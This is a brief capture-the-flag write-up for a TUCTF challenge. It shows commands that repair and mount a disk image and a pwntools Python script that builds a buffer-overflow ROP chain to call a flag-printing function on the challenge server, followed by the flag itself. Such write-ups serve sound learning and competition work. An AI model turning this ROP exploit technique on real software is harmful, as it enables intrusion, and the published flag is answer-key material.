Solved by Dan
start by mounting the disk image found in previous Mega challenges
losetup /dev/loop7 broken.img
fsck.ext4 -b 0 -B 1024 /dev/loop7
# click through with all Y's
mkdir mounted
mount /dev/loop7 mounted
Get the binary rop_me_like_a_hurricane
It is a mini rop challenge, a printFlag function is provided, but requires setting some global variables first. I jump to read to do this.

#!/usr/bin/env python3.7
import pwn

POP_ESI_EDI_EBP =  0x08049471
TARGET = 0x804c03c
READ = 0x080490c0
BUFFER_SIZE = 0x18
PRINT_FLAG = 0x080492ce

ROPS = pwn.p32(READ) + pwn.p32(POP_ESI_EDI_EBP) + pwn.p32(0) + pwn.p32(TARGET) + pwn.p32(12)
ROPS += pwn.p32(PRINT_FLAG)
PAYLOAF = b'a'*(BUFFER_SIZE + 4) + ROPS + b'a'*100

r = pwn.remote('chal.tuctf.com', 31058)
r.sendline(PAYLOAF)
r.recvline()
print(r.recvline().decode('utf-8').strip().split()[1])

TUCTF{bu7_c4n_y0u_ROP_bl1ndf0ld3d?}

